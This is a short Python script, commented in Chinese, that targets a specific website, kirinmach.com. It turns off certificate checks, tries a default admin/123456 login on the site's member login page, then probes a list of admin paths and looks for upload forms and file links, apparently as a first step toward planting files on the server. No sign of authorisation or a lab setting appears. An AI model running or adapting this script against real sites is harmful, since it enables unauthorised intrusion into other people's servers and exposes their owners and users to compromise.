#!/usr/bin/env python3
"""kirinmach ASP后台 - 登录+探索上传点"""
import urllib.request, urllib.parse, re, http.cookiejar, ssl

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
HOST = "http://kirinmach.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=12, data=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read(100000).decode("gbk", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(10000).decode("gbk", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

op, cj = get_opener()
# 1. 登录页
st, fu, body = fetch(op, HOST + "/MemberReg/login.asp?act=login")
print("login page: st=%s size=%d" % (st, len(body)), flush=True)
# 找表单字段
for m in re.finditer(r'<input[^>]*>', body):
    t = m.group(0)
    if "password" in t.lower() or "user" in t.lower() or "name" in t.lower():
        print("  INPUT:", t[:150], flush=True)
forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*>', body, re.I)
print("  forms:", forms[:5], flush=True)
# 2. 尝试登录 admin/123456
login_url = HOST + "/MemberReg/login.asp?act=login"
data = urllib.parse.urlencode({"username": "admin", "password": "123456", "user": "admin", "pwd": "123456", "act": "login"})
st, fu, body = fetch(op, login_url, data=data)
print("login post: st=%s fu=%s size=%d" % (st, fu[:80], len(body)), flush=True)
if "错误" in body or "失败" in body:
    print("  LOGIN FAILED:", body[:300].replace("\r"," ").replace("\n"," "), flush=True)
else:
    print("  possible success, body head:", body[:300].replace("\r"," ").replace("\n"," "), flush=True)
# 3. 尝试后台管理页
for p in ["/MemberReg/index.asp", "/MemberReg/main.asp", "/MemberReg/default.asp",
          "/News/Manage.asp", "/admin/default.asp", "/MemberReg/NewsPic.asp",
          "/MemberReg/NewsPic_Add.asp", "/NewsPic/Add.asp"]:
    st, fu, b2 = fetch(op, HOST + p)
    print("  GET %s -> st=%s size=%d" % (p, st, len(b2)), flush=True)
    if st == 200 and len(b2) > 500 and "登录" not in b2[:200]:
        # 找上传表单
        ups = re.findall(r'<form[^>]*action="([^"]*(?:upload|add|pic|img|file)[^"]*)"[^>]*>', b2, re.I)
        if ups:
            print("    UPLOAD FORM:", ups, flush=True)
        links = sorted(set(re.findall(r'href="([^"]*(?:upload|pic|img|file|add|News)[^"]*)"', b2, re.I)))
        print("    links:", links[:15], flush=True)
